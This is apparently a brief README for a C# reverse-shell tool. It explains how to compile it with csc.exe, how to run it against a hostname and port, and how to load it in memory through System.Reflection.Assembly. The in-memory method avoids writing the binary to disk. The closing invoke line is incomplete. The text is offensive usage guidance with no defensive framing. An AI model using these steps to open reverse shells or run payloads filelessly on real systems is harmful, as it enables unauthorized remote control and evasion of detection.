# Reverse-Shell-CSharp

Compile the file with csc.exe /target:exe /out:[FILENAME].exe .\Program.cs

.\[FILENAME].exe HOSTNAME PORT

Can execute in memory with System.Reflection.Assembly

In case executing in memory, you need to create a variable with the type String[], because int main(String[] args)

invoke(null, (, @($hostname, $port)))

